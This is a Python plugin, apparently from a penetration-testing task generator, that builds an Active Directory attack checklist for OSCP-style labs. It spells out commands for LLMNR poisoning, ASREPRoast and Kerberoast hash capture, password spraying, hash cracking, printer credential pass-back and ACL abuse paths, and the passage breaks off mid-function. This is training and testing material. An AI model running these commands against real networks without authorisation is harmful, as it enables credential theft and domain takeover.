"""
Active Directory enumeration plugin

Generates tasks for AD enumeration including:
- Initial recon (no credentials)
- User enumeration (Kerbrute, LDAP, SMB)
- Password attacks (ASREPRoast, Kerberoast, password spraying)
- BloodHound collection
- DNS enumeration
- ADWS (Active Directory Web Services) enumeration
- Printer exploitation
- Trust relationship mapping

Extracted from HackTricks Active Directory Methodology
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class ADEnumerationPlugin(ServicePlugin):
    """Active Directory enumeration plugin"""

    @property
    def name(self) -> str:
        return "ad-enumeration"

    @property
    def default_ports(self) -> List[int]:
        return [88, 389, 636, 3268, 3269, 9389]

    @property
    def service_names(self) -> List[str]:
        return ['kerberos', 'ldap', 'ldaps', 'globalcat', 'adws', 'active-directory']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect AD services - returns False for manual trigger"""
        # AD enumeration is complex and often requires manual trigger
        # Return False to prevent auto-detection
        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Active Directory enumeration task tree"""
        domain = service_info.get('domain', 'DOMAIN.LOCAL')

        tasks = {
            'id': f'ad-enum-{target}',
            'name': f'Active Directory Enumeration: {target}',
            'type': 'parent',
            'children': []
        }

        # ===== PHASE 1: RECON WITHOUT CREDENTIALS =====
        tasks['children'].append({
            'id': f'ad-recon-nocreds-{target}',
            'name': 'Phase 1: Recon Without Credentials',
            'type': 'parent',
            'children': [
                # DNS Enumeration
                {
                    'id': f'ad-dns-enum-{target}',
                    'name': 'DNS Enumeration',
                    'type': 'command',
                    'metadata': {
                        'command': f'gobuster dns -d {domain} -t 25 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt',
                        'description': 'Enumerate DNS records to find key servers (web, printers, shares, VPN)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                        'flag_explanations': {
                            '-d': f'Target domain ({domain})',
                            '-t': 'Number of concurrent threads (25 for speed)',
                            '-w': 'Wordlist for subdomain brute-forcing'
                        },
                        'success_indicators': [
                            'Subdomains discovered (web, mail, vpn, shares)',
                            'Potential target hosts identified'
                        ],
                        'failure_indicators': [
                            'DNS server not responding',
                            'No subdomains found (try different wordlist)'
                        ],
                        'next_steps': [
                            'Nmap service scan on discovered hosts',
                            'Check for web applications on discovered subdomains',
                            'Look for printers and file shares'
                        ],
                        'alternatives': [
                            f'nslookup -type=ANY {domain}',
                            f'dig axfr @{target} {domain}',
                            f'dnsrecon -d {domain} -t brt -D /usr/share/wordlists/subdomains.txt'
                        ],
                        'notes': 'DNS enumeration provides attack surface mapping before authentication'
                    }
                },
                # AD DNS Dump with adidnsdump
                {
                    'id': f'ad-adidnsdump-{target}',
                    'name': 'Dump AD DNS Records (adidnsdump)',
                    'type': 'command',
                    'metadata': {
                        'command': f'adidnsdump -u "DOMAIN\\username" ldap://{target} -r',
                        'description': 'Enumerate ALL DNS records in AD zone (like zone transfer)',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'REQUIRES_AUTH'],
                        'flag_explanations': {
                            '-u': 'Domain credentials (any user can enumerate)',
                            'ldap://': 'LDAP connection to Domain Controller',
                            '-r': 'Resolve hidden DNS records'
                        },
                        'success_indicators': [
                            'records.csv created with DNS entries',
                            'Hidden internal hosts discovered'
                        ],
                        'failure_indicators': [
                            'Authentication failed',
                            'LDAP connection timeout'
                        ],
                        'next_steps': [
                            'Analyze records.csv for interesting hosts',
                            'Target web servers, printers, file shares',
                            'Check for WPAD entries (web proxy auto-discovery)'
                        ],
                        'alternatives': [
                            f'ldapsearch -h {target} -x -b "DC=DomainDnsZones,DC={domain.split(".")[0]},DC={domain.split(".")[1]}"',
                            'PowerShell: Get-DnsServerResourceRecord -ZoneName domain.local'
                        ],
                        'notes': 'Any authenticated user can dump DNS by default. Tool: https://github.com/dirkjanm/adidnsdump'
                    }
                },
                # LDAP Anonymous Enumeration
                {
                    'id': f'ad-ldap-anon-{target}',
                    'name': 'LDAP Anonymous Enumeration',
                    'type': 'command',
                    'metadata': {
                        'command': f'nmap -n -sV --script "ldap* and not brute" -p 389 {target}',
                        'description': 'Attempt anonymous LDAP enumeration for domain information',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                        'flag_explanations': {
                            '-n': 'No DNS resolution (faster)',
                            '-sV': 'Service version detection',
                            '--script': 'Run LDAP NSE scripts (excluding brute-force)',
                            '-p 389': 'LDAP port'
                        },
                        'success_indicators': [
                            'Domain naming context revealed',
                            'Domain functional level discovered',
                            'LDAP objects enumerated'
                        ],
                        'failure_indicators': [
                            'Anonymous access denied',
                            'LDAP bind failed'
                        ],
                        'next_steps': [
                            'If anonymous access works: enumerate users, groups, computers',
                            'Try guest account: enum4linux -a -u "guest" -p "" <DC>',
                            'Move to authenticated enumeration'
                        ],
                        'alternatives': [
                            f'ldapsearch -h {target} -x -b "DC={domain.split(".")[0]},DC={domain.split(".")[1]}" -s sub',
                            f'enum4linux -a -u "" -p "" {target}'
                        ],
                        'notes': 'Anonymous LDAP is rare on modern Windows but worth testing'
                    }
                },
                # SMB Null Session
                {
                    'id': f'ad-smb-null-{target}',
                    'name': 'SMB Null Session Enumeration',
                    'type': 'command',
                    'metadata': {
                        'command': f'enum4linux -a -u "" -p "" {target}',
                        'description': 'Attempt null session SMB enumeration (legacy Windows)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                        'flag_explanations': {
                            '-a': 'Do all simple enumeration (users, shares, groups, policies)',
                            '-u ""': 'Empty username (null session)',
                            '-p ""': 'Empty password'
                        },
                        'success_indicators': [
                            'User list obtained',
                            'Share enumeration successful',
                            'Password policy discovered'
                        ],
                        'failure_indicators': [
                            'Access denied (null sessions disabled)',
                            'Connection refused'
                        ],
                        'next_steps': [
                            'Try guest account: -u "guest" -p ""',
                            'Test discovered shares: smbclient //<DC>/<SHARE> -N',
                            'Move to authenticated enumeration if null fails'
                        ],
                        'alternatives': [
                            f'smbclient -L //{target} -N',
                            f'smbmap -u "" -p "" -H {target}',
                            f'crackmapexec smb {target} -u "" -p "" --shares'
                        ],
                        'notes': 'Null sessions disabled by default on modern Windows (Server 2008+)'
                    }
                },
                # Network Poisoning Setup
                {
                    'id': f'ad-responder-{target}',
                    'name': 'Network Poisoning with Responder',
                    'type': 'command',
                    'metadata': {
                        'command': 'responder -I eth0 -wrf',
                        'description': 'Capture credentials via LLMNR/NBT-NS/MDNS poisoning',
                        'tags': ['OSCP:HIGH', 'NOISY', 'EXPLOIT'],
                        'flag_explanations': {
                            '-I': 'Network interface to listen on',
                            '-w': 'Start WPAD rogue proxy server',
                            '-r': 'Enable answers for netbios wredir suffix queries',
                            '-f': 'Fingerprint hosts that request NTLM authentication'
                        },
                        'success_indicators': [
                            'NTLMv2 hashes captured',
                            'HTTP/SMB authentication attempts logged'
                        ],
                        'failure_indicators': [
                            'No network traffic',
                            'Firewall blocking responses'
                        ],
                        'next_steps': [
                            'Crack captured NTLMv2 hashes: hashcat -m 5600',
                            'Relay attacks with ntlmrelayx.py if SMB signing disabled',
                            'Use cracked credentials for authenticated enumeration'
                        ],
                        'alternatives': [
                            'Inveigh (PowerShell version for Windows hosts)',
                            'evil-ssdp for UPnP device spoofing'
                        ],
                        'notes': 'Very noisy - generates network alerts. Use in isolated lab environments only during OSCP exam'
                    }
                }
            ]
        })

        # ===== PHASE 2: USER ENUMERATION =====
        tasks['children'].append({
            'id': f'ad-user-enum-{target}',
            'name': 'Phase 2: User Enumeration',
            'type': 'parent',
            'children': [
                # Kerbrute User Enumeration
                {
                    'id': f'ad-kerbrute-enum-{target}',
                    'name': 'Kerbrute User Enumeration',
                    'type': 'command',
                    'metadata': {
                        'command': f'kerbrute userenum -d {domain} --dc {target} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt',
                        'description': 'Enumerate valid usernames via Kerberos pre-auth without authentication',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                        'flag_explanations': {
                            'userenum': 'Username enumeration mode',
                            '-d': f'Target domain ({domain})',
                            '--dc': 'Domain Controller IP address',
                            'wordlist': 'Username list to test'
                        },
                        'success_indicators': [
                            'Valid usernames discovered (TGT or PREAUTH_REQUIRED)',
                            'No lockout triggered (read-only Kerberos check)'
                        ],
                        'failure_indicators': [
                            'KDC_ERR_C_PRINCIPAL_UNKNOWN for all users',
                            'Connection timeout to port 88'
                        ],
                        'next_steps': [
                            'Test for ASREPRoastable users (no preauth required)',
                            'Password spray with common passwords',
                            'Target users for further enumeration'
                        ],
                        'alternatives': [
                            f'nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm={domain} {target}',
                            'crackmapexec smb <DC> -u "" -p "" --users',
                            'NauthNRPC tool via MS-NRPC (no auth required)'
                        ],
                        'notes': 'Kerbrute is stealthy (no account lockout risk). Download: https://github.com/ropnop/kerbrute/releases'
                    }
                },
                # RID Cycling
                {
                    'id': f'ad-rid-cycling-{target}',
                    'name': 'RID Cycling User Enumeration',
                    'type': 'command',
                    'metadata': {
                        'command': f'crackmapexec smb {target} -u "" -p "" --rid-brute',
                        'description': 'Enumerate users via RID cycling (500-5000)',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-u ""': 'Null session attempt',
                            '-p ""': 'Empty password',
                            '--rid-brute': 'Brute-force SIDs by incrementing RID'
                        },
                        'success_indicators': [
                            'User accounts enumerated (SidTypeUser)',
                            'Group names discovered'
                        ],
                        'failure_indicators': [
                            'Access denied (null session disabled)',
                            'No results (restrictanonymous=1)'
                        ],
                        'next_steps': [
                            'Save user list for password spraying',
                            'Check for default/weak accounts (Guest, Administrator)',
                            'Try with guest account if null fails'
                        ],
                        'alternatives': [
                            'enum4linux -r -u "" -p ""',
                            'rpcclient -U "" -N <DC> → enumdomusers',
                            'impacket-lookupsid <DOMAIN>/"":""@<DC>'
                        ],
                        'notes': 'RID 500=Administrator, 501=Guest, 512=Domain Admins. Users typically start at 1000+'
                    }
                },
                # ADIDNS Dump (additional recon with auth)
                {
                    'id': f'ad-adidns-auth-{target}',
                    'name': 'AD DNS Zone Dump (Authenticated)',
                    'type': 'command',
                    'metadata': {
                        'command': f'adidnsdump -u "{domain}\\username" ldap://{target} -r --print-zones',
                        'description': 'Enumerate all DNS records from all zones (requires auth)',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-u': 'Domain credentials (format: DOMAIN\\user)',
                            'ldap://': 'LDAP connection to DC',
                            '-r': 'Resolve IP addresses for DNS records',
                            '--print-zones': 'List all available DNS zones first'
                        },
                        'success_indicators': [
                            'DNS zones enumerated (DomainDnsZones, ForestDnsZones)',
                            'records.csv created with complete DNS records',
                            'Hidden internal hosts revealed'
                        ],
                        'failure_indicators': [
                            'LDAP authentication failed',
                            'No DNS zones returned'
                        ],
                        'next_steps': [
                            'Analyze records.csv for interesting hosts',
                            'Look for WPAD entries (web proxy hijacking)',
                            'Target printers, file servers, backup systems',
                            'Check for wildcard DNS entries'
                        ],
                        'alternatives': [
                            'PowerShell: Get-DnsServerResourceRecord',
                            f'ldapsearch -h {target} -D "CN=user,CN=Users,DC=domain,DC=local"'
                        ],
                        'notes': 'Any authenticated user can enumerate DNS. Often reveals hosts not in LDAP computer objects.'
                    }
                }
            ]
        })

        # ===== PHASE 3: PASSWORD ATTACKS (NO/LIMITED CREDS) =====
        tasks['children'].append({
            'id': f'ad-password-attacks-{target}',
            'name': 'Phase 3: Password Attacks (Limited Access)',
            'type': 'parent',
            'children': [
                # ASREPRoast
                {
                    'id': f'ad-asreproast-{target}',
                    'name': 'ASREPRoast Attack',
                    'type': 'command',
                    'metadata': {
                        'command': f'GetNPUsers.py {domain}/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt',
                        'description': 'Request AS-REP for users without Kerberos pre-authentication',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'QUICK_WIN'],
                        'flag_explanations': {
                            '{domain}/': 'Target domain (no credentials needed)',
                            '-usersfile': 'File containing potential usernames',
                            '-format hashcat': 'Output format for hashcat cracking',
                            '-outputfile': 'Save hashes to file'
                        },
                        'success_indicators': [
                            'AS-REP hashes captured ($krb5asrep$23$...)',
                            'Users without PREAUTH_REQUIRED found'
                        ],
                        'failure_indicators': [
                            'All users require pre-authentication',
                            'KDC_ERR_CLIENT_NOT_FOUND (invalid usernames)'
                        ],
                        'next_steps': [
                            'Crack hashes: hashcat -m 18200 asrep_hashes.txt wordlist.txt',
                            'Use cracked credentials for authenticated enumeration',
                            'Check if cracked user has interesting privileges'
                        ],
                        'alternatives': [
                            'Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt',
                            'ASRepCatcher (man-in-the-middle capture of AS-REP packets)',
                            'Manual: Request AS-REQ without pre-auth data'
                        ],
                        'notes': 'No credentials needed! Users with "Do not require Kerberos preauthentication" are vulnerable. Stealthy attack.'
                    }
                },
                # Password Spraying
                {
                    'id': f'ad-password-spray-{target}',
                    'name': 'Password Spraying',
                    'type': 'command',
                    'metadata': {
                        'command': f'crackmapexec smb {target} -u users.txt -p "Password123!" --continue-on-success',
                        'description': 'Test common password against all discovered users',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'NOISY'],
                        'flag_explanations': {
                            '-u users.txt': 'File containing valid usernames',
                            '-p': 'Single password to test (or -p passwords.txt for list)',
                            '--continue-on-success': 'Test all users even after success'
                        },
                        'success_indicators': [
                            '[+] DOMAIN\\user:password (Pwn3d!)',
                            'Valid credentials discovered'
                        ],
                        'failure_indicators': [
                            'Account lockout warnings',
                            'All authentication failures'
                        ],
                        'next_steps': [
                            'Check password policy first: crackmapexec smb <DC> -u user -p pass --pass-pol',
                            'Respect lockout threshold (default: 5 attempts)',
                            'Use valid credentials for authenticated enumeration',
                            'Check for password re-use across accounts'
                        ],
                        'alternatives': [
                            f'kerbrute passwordspray -d {domain} --dc {target} users.txt Password123!',
                            'Rubeus.exe spray /users:users.txt /passwords:pass.txt',
                            'DomainPasswordSpray.ps1 -UserList users.txt -Password P@ssw0rd'
                        ],
                        'notes': 'CRITICAL: Get password policy first! Default lockout threshold is often 5 attempts in 30 mins. Use 1-2 attempts max.'
                    }
                },
                # Get Password Policy (requires at least one cred)
                {
                    'id': f'ad-password-policy-{target}',
                    'name': 'Retrieve Password Policy',
                    'type': 'command',
                    'metadata': {
                        'command': f'crackmapexec smb {target} -u "user" -p "password" --pass-pol',
                        'description': 'Get domain password policy to avoid lockouts',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                        'flag_explanations': {
                            '-u': 'Domain username',
                            '-p': 'User password',
                            '--pass-pol': 'Query domain password policy via SMB'
                        },
                        'success_indicators': [
                            'Minimum password length displayed',
                            'Lockout threshold shown (attempts before lockout)',
                            'Lockout observation window revealed'
                        ],
                        'failure_indicators': [
                            'Access denied',
                            'Invalid credentials'
                        ],
                        'next_steps': [
                            'Calculate safe spray attempts: (threshold - 1) per user',
                            'Note lockout duration (usually 30 minutes)',
                            'Plan password spray with safety margin'
                        ],
                        'alternatives': [
                            f'enum4linux -P -u user -p pass {target}',
                            f'rpcclient -U "user%pass" {target} → querydominfo',
                            f'ldapsearch -h {target} -x -b "DC=domain,DC=local" -s sub "*" | grep pwdHistoryLength'
                        ],
                        'notes': 'ALWAYS check policy before spraying. Default: 5 attempts / 30 min window. Err on side of caution (use 2-3 max).'
                    }
                }
            ]
        })

        # ===== PHASE 4: AUTHENTICATED ENUMERATION =====
        tasks['children'].append({
            'id': f'ad-auth-enum-{target}',
            'name': 'Phase 4: Authenticated Enumeration',
            'type': 'parent',
            'children': [
                # BloodHound Collection
                {
                    'id': f'ad-bloodhound-{target}',
                    'name': 'BloodHound Collection (SharpHound)',
                    'type': 'command',
                    'metadata': {
                        'command': f'bloodhound-python -u user -p password -d {domain} -dc {target} -c All --zip',
                        'description': 'Collect AD relationships for attack path analysis',
                        'tags': ['OSCP:HIGH', 'ENUM', 'NOISY'],
                        'flag_explanations': {
                            '-u': 'Domain username',
                            '-p': 'User password (or -hashes for NTLM)',
                            '-d': 'Target domain FQDN',
                            '-dc': 'Domain Controller IP',
                            '-c All': 'Collection method (All = full sweep)',
                            '--zip': 'Create ZIP file for BloodHound import'
                        },
                        'success_indicators': [
                            'JSON files created (computers.json, users.json, groups.json, etc.)',
                            'ZIP archive ready for BloodHound'
                        ],
                        'failure_indicators': [
                            'LDAP bind failed',
                            'Insufficient privileges',
                            'Connection timeout'
                        ],
                        'next_steps': [
                            'Import ZIP into BloodHound GUI',
                            'Run pre-built queries: "Find shortest path to Domain Admins"',
                            'Check for: Kerberoastable users, ASREPRoastable, unconstrained delegation',
                            'Analyze ACL abuse paths (GenericAll, WriteDacl, etc.)'
                        ],
                        'alternatives': [
                            'SharpHound.exe -c All --outputdirectory C:\\temp',
                            'Invoke-BloodHound -CollectionMethod All',
                            'SharpHound.exe --Stealth --LDAP (low noise)'
                        ],
                        'notes': 'NOISY! Generates significant LDAP queries. Use --Stealth for quieter collection. BloodHound is essential for AD attack paths.'
                    }
                },
                # ADWS Stealth Collection (SoaPy)
                {
                    'id': f'ad-soapy-enum-{target}',
                    'name': 'Stealth ADWS Enumeration (SoaPy)',
                    'type': 'command',
                    'metadata': {
                        'command': f'soapy {domain}/user:password@{target} -q "(objectClass=user)" | tee users.log',
                        'description': 'Stealthy AD enumeration via ADWS (port 9389) - less monitored than LDAP',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'STEALTH'],
                        'flag_explanations': {
                            '{domain}/user:password@{target}': 'Authentication string',
                            '-q': 'LDAP-style query filter',
                            '(objectClass=user)': 'Filter for user objects',
                            '| tee': 'Save output to file'
                        },
                        'success_indicators': [
                            'User objects enumerated',
                            'ADWS connection successful on port 9389'
                        ],
                        'failure_indicators': [
                            'ADWS service not running (pre-2008 R2 DCs)',
                            'Port 9389 filtered/closed'
                        ],
                        'next_steps': [
                            'Query for computers: -q "(objectClass=computer)"',
                            'Get groups: -q "(objectClass=group)"',
                            'Collect ADCS objects for certificate attacks',
                            'Convert output with BOFHound for BloodHound import'
                        ],
                        'alternatives': [
                            'ldapsearch over port 389/636 (more monitored)',
                            'PowerShell Get-ADUser (requires RSAT)',
                            'ADWS write operations for RBCD: --set msDs-AllowedToActOnBehalfOfOtherIdentity'
                        ],
                        'notes': 'ADWS (port 9389) is less monitored than LDAP. Blends with admin tools. Install: pip install soapy-adws'
                    }
                },
                # Kerberoasting
                {
                    'id': f'ad-kerberoast-{target}',
                    'name': 'Kerberoast Attack',
                    'type': 'command',
                    'metadata': {
                        'command': f'GetUserSPNs.py {domain}/user:password -request -outputfile kerberoast_hashes.txt',
                        'description': 'Request TGS tickets for service accounts to crack offline',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'QUICK_WIN'],
                        'flag_explanations': {
                            '{domain}/user:password': 'Valid domain credentials',
                            '-request': 'Request TGS tickets for discovered SPNs',
                            '-outputfile': 'Save hashes to file for cracking'
                        },
                        'success_indicators': [
                            'TGS tickets obtained ($krb5tgs$23$...)',
                            'Service accounts with SPNs discovered'
                        ],
                        'failure_indicators': [
                            'No SPNs found (no service accounts)',
                            'Authentication failed'
                        ],
                        'next_steps': [
                            'Crack hashes: hashcat -m 13100 kerberoast_hashes.txt wordlist.txt',
                            'Target accounts with old passwords: --pwdsetbefore 2020-01-01',
                            'Check for privileged service accounts (SQL, IIS)',
                            'Use cracked service account for lateral movement'
                        ],
                        'alternatives': [
                            'Rubeus.exe kerberoast /outfile:hashes.txt',
                            'PowerView: Get-DomainSPNTicket -Format Hashcat',
                            'Targeted: GetUserSPNs.py -request-user svc_sql'
                        ],
                        'notes': 'Any authenticated user can request TGS tickets. RC4 hashes (etype 23) crack faster than AES. Check: Rubeus.exe kerberoast /stats'
                    }
                },
                # Extract All Domain Users
                {
                    'id': f'ad-extract-users-{target}',
                    'name': 'Extract All Domain Users',
                    'type': 'command',
                    'metadata': {
                        'command': f'GetADUsers.py -all -dc-ip {target} {domain}/user:password',
                        'description': 'Extract complete user list with attributes',
                        'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-all': 'Extract all user attributes',
                            '-dc-ip': 'Domain Controller IP address',
                            '{domain}/user:password': 'Valid credentials'
                        },
                        'success_indicators': [
                            'User list with SAMAccountName, email, groups',
                            'User descriptions (sometimes contain passwords!)'
                        ],
                        'failure_indicators': [
                            'LDAP bind failed',
                            'Connection timeout'
                        ],
                        'next_steps': [
                            'Check user descriptions for passwords',
                            'Look for accounts with adminCount=1 (privileged)',
                            'Identify potential targets for lateral movement',
                            'Build username list for password attacks'
                        ],
                        'alternatives': [
                            'PowerShell: Get-DomainUser (PowerView)',
                            'net user /domain',
                            'ldapsearch -h <DC> -x -b "CN=Users,DC=domain,DC=local"',
                            'crackmapexec ldap <DC> -u user -p pass --users'
                        ],
                        'notes': 'Check userPassword, unixUserPassword, and Description LDAP fields - often contain clear-text passwords!'
                    }
                },
                # PowerView Enumeration
                {
                    'id': f'ad-powerview-{target}',
                    'name': 'PowerView Comprehensive Enumeration',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Windows-based AD enumeration with PowerView (from compromised host)',
                        'tags': ['OSCP:HIGH', 'ENUM', 'WINDOWS'],
                        'commands': [
                            'Import-Module .\\PowerView.ps1',
                            'Get-Domain # Domain information',
                            'Get-DomainController # List DCs',
                            'Get-DomainUser # All users',
                            'Get-DomainComputer # All computers',
                            'Get-DomainGroup # All groups',
                            'Get-DomainGroupMember "Domain Admins" # DA members',
                            'Get-DomainOU # Organizational Units',
                            'Get-DomainGPO # Group Policy Objects',
                            'Get-DomainTrust # Trust relationships',
                            'Find-DomainShare # Find network shares',
                            'Find-InterestingDomainShareFile # Hunt for files',
                            'Get-DomainUser -PreauthNotRequired # ASREPRoastable',
                            'Get-DomainUser -SPN # Kerberoastable'
                        ],
                        'notes': 'PowerView must run from Windows host. Stealthier than LDAP queries from attacker machine. Download: https://github.com/PowerShellMafia/PowerSploit'
                    }
                },
                # Printer Exploitation
                {
                    'id': f'ad-printer-exploit-{target}',
                    'name': 'Printer Pass-Back Attack',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit printer LDAP/SMB pass-back to capture credentials',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'CREDENTIALS'],
                        'commands': [
                            '# 1. Find printers via nmap or LDAP',
                            'nmap -p 80,443,515,9100 --script printer-info <range>',
                            '',
                            '# 2. Access printer web interface (often no auth or default creds)',
                            '# Default creds: admin/admin, admin/password, admin/<blank>',
                            '',
                            '# 3. Change LDAP server to attacker IP',
                            '# Settings → Network → LDAP → Server: <attacker_IP>',
                            '',
                            '# 4. Start rogue LDAP server',
                            'sudo slapd -d 2 -h "ldap:///"',
                            '# OR: sudo nc -k -v -l -p 389',
                            '',
                            '# 5. Trigger connection (Test Connection button)',
                            '# Printer sends clear-text LDAP credentials',
                            '',
                            '# 6. For SMB pass-back:',
                            'impacket-smbserver share . -smb2support',
                            '# Configure printer scan-to-folder → attacker IP'
                        ],
                        'success_indicators': [
                            'Clear-text LDAP credentials captured',
                            'NetNTLMv2 hash from SMB captured',
                            'Domain service account password obtained'
                        ],
                        'notes': 'Printers often authenticate to LDAP/SMB with privileged accounts. CVE-2024-12510 (Xerox), recent Canon advisories. Tool: PRET, Praeda'
                    }
                }
            ]
        })

        # ===== PHASE 5: POST-COMPROMISE ENUMERATION =====
        tasks['children'].append({
            'id': f'ad-post-compromise-{target}',
            'name': 'Phase 5: Post-Compromise Enumeration',
            'type': 'parent',
            'children': [
                # Shared Folder Enumeration
                {
                    'id': f'ad-share-enum-{target}',
                    'name': 'Enumerate Domain Shares',
                    'type': 'command',
                    'metadata': {
                        'command': f'crackmapexec smb {target} -u user -p password --shares',
                        'description': 'Find accessible network shares across domain',
                        'tags': ['OSCP:HIGH', 'ENUM', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-u': 'Domain username',
                            '-p': 'User password',
                            '--shares': 'Enumerate SMB shares and access levels'
                        },
                        'success_indicators': [
                            'Readable/writable shares discovered',
                            'Shares like SYSVOL, NETLOGON, Users accessible'
                        ],
                        'failure_indicators': [
                            'Access denied to all shares',
                            'Connection timeout'
                        ],
                        'next_steps': [
                            'Download interesting files: smbclient //{target}/share -U user',
                            'Search for credentials: passwords.txt, config files, scripts',
                            'Check SYSVOL for GPP passwords (Groups.xml)',
                            'Upload malicious files to writable shares for code execution'
                        ],
                        'alternatives': [
                            'smbmap -u user -p password -H <DC> -R',
                            'PowerView: Find-DomainShare -CheckShareAccess',
                            'Snaffler (recursive search for creds in shares)'
                        ],
                        'notes': 'SYSVOL often contains GPP passwords (cpassword field). Use gpp-decrypt to decode.'
                    }
                },
                # Trust Relationship Enumeration
                {
                    'id': f'ad-trust-enum-{target}',
                    'name': 'Enumerate Trust Relationships',
                    'type': 'command',
                    'metadata': {
                        'command': f'crackmapexec ldap {target} -u user -p password --trusted-for-delegation',
                        'description': 'Discover domain trusts and delegation configurations',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'LATERAL'],
                        'flag_explanations': {
                            '-u': 'Domain username',
                            '-p': 'User password',
                            '--trusted-for-delegation': 'Find accounts/computers with delegation enabled'
                        },
                        'success_indicators': [
                            'Unconstrained delegation accounts found',
                            'Constrained delegation targets identified',
                            'Forest/external trusts discovered'
                        ],
                        'failure_indicators': [
                            'No delegation configured',
                            'LDAP query failed'
                        ],
                        'next_steps': [
                            'Exploit unconstrained delegation if found',
                            'Abuse constrained delegation with protocol transition',
                            'Map trust relationships for lateral movement',
                            'Check for forest trusts (cross-domain attacks)'
                        ],
                        'alternatives': [
                            'PowerView: Get-DomainTrust, Get-DomainComputer -Unconstrained',
                            'BloodHound queries: "Find Computers with Unconstrained Delegation"',
                            'ldapsearch: (userAccountControl:1.2.840.113556.1.4.803:=524288)'
                        ],
                        'notes': 'Unconstrained delegation = free DA if admin logs into that host. Check BloodHound for paths.'
                    }
                },
                # ACL Enumeration
                {
                    'id': f'ad-acl-enum-{target}',
                    'name': 'ACL Abuse Path Discovery',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Find ACL-based privilege escalation paths',
                        'tags': ['OSCP:HIGH', 'ENUM', 'PRIVESC'],
                        'commands': [
                            '# PowerView ACL enumeration',
                            'Find-InterestingDomainAcl -ResolveGUIDs',
                            '',
                            '# Check if current user has interesting ACLs',
                            'Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq (Get-DomainUser).objectsid}',
                            '',
                            '# BloodHound queries (most effective)',
                            '# "Shortest Paths to Domain Admins from Owned Principals"',
                            '# "Find Principals with DCSync Rights"',
                            '# "Shortest Paths to Unconstrained Delegation Systems"',
                            '',
                            '# Check for GenericAll/WriteDacl/WriteOwner on high-value targets',
                            'Get-DomainObjectAcl -Identity "Domain Admins" | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}'
                        ],
                        'success_indicators': [
                            'GenericAll on user/group/computer',
                            'WriteDacl on domain object',
                            'WriteOwner on privileged group'
                        ],
                        'notes': 'ACL abuse paths: GenericAll → reset password, WriteDacl → grant DCSync, WriteOwner → take ownership. Use BloodHound!'
                    }
                }
            ]
        })

        return tasks

    def on_task_complete(self, task_id: str, result: str, target: str) -> List[Dict[str, Any]]:
        """Parse AD enumeration results and spawn additional tasks"""
        new_tasks = []

        # If ASREPRoast found hashes, add cracking task
        if 'asreproast' in task_id and '$krb5asrep$' in result:
            new_tasks.append({
                'id': f'crack-asrep-{target}',
                'name': 'Crack ASREPRoast Hashes',
                'type': 'command',
                'metadata': {
                    'command': 'hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt',
                    'description': 'Crack captured AS-REP hashes',
                    'tags': ['OSCP:HIGH', 'EXPLOIT']
                }
            })

        # If Kerberoast found hashes, add cracking task
        if 'kerberoast' in task_id and '$krb5tgs$' in result:
            new_tasks.append({
                'id': f'crack-kerberoast-{target}',
                'name': 'Crack Kerberoast Hashes',
                'type': 'command',
                'metadata': {
                    'command': 'hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt',
                    'description': 'Crack TGS service ticket hashes',
                    'tags': ['OSCP:HIGH', 'EXPLOIT']
                }
            })

        # If valid credentials found via password spray
        if 'password-spray' in task_id and 'Pwn3d!' in result:
            new_tasks.append({
                'id': f'bloodhound-auto-{target}',
                'name': 'Run BloodHound with Valid Credentials',
                'type': 'command',
                'metadata': {
                    'command': f'bloodhound-python -u <user> -p <password> -d domain.local -dc {target} -c All --zip',
                    'description': 'Collect AD relationships now that we have credentials',
                    'tags': ['OSCP:HIGH', 'ENUM']
                }
            })

        # If BloodHound completed, remind to analyze
        if 'bloodhound' in task_id and '.zip' in result:
            new_tasks.append({
                'id': f'bloodhound-analysis-{target}',
                'name': 'Analyze BloodHound Data',
                'type': 'manual',
                'metadata': {
                    'description': 'Import BloodHound ZIP and run queries',
                    'tags': ['OSCP:HIGH', 'ANALYSIS'],
                    'notes': [
                        'Import ZIP into BloodHound GUI',
                        'Mark compromised user as owned',
                        'Run: "Shortest Paths to Domain Admins from Owned Principals"',
                        'Check for: Kerberoastable users, unconstrained delegation, ACL abuse'
                    ]
                }
            })

        return new_tasks

    def get_manual_alternatives(self, task_id: str) -> List[str]:
        """Get manual alternatives for AD enumeration tasks"""
        alternatives = {
            'kerbrute': [
                'Manual: nmap -p 88 --script=krb5-enum-users',
                'Manual: use kinit to test each username',
                'crackmapexec smb <DC> --users (requires null/guest session)'
